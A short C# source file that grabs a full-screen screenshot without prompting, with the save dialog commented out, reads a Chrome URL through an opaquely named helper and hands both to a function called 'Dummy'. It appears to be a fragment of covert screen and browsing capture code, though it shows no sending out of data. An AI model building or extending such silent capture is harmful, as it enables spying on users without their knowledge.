using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace ScreenShoter
{
    public static class ScreenShoter
    {
        public static void GetSH()
        {
            string url = Class3.GetURL("chrome");
            Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics GH = Graphics.FromImage(BM as Image);
            GH.CopyFromScreen(0, 0, 0, 0, BM.Size);

            //SaveFileDialog SFD = new SaveFileDialog();
            //SFD.Filter = "PNG|*.png|JPEG|*.jpg|GIF|*.gif|BMP|*.bmp";
            //if (SFD.ShowDialog() == DialogResult.OK)
            //{
            //    BM.Save(SFD.FileName);
            //}

            ExcelAPI.Dummy(GH, url);
        }

    }
}
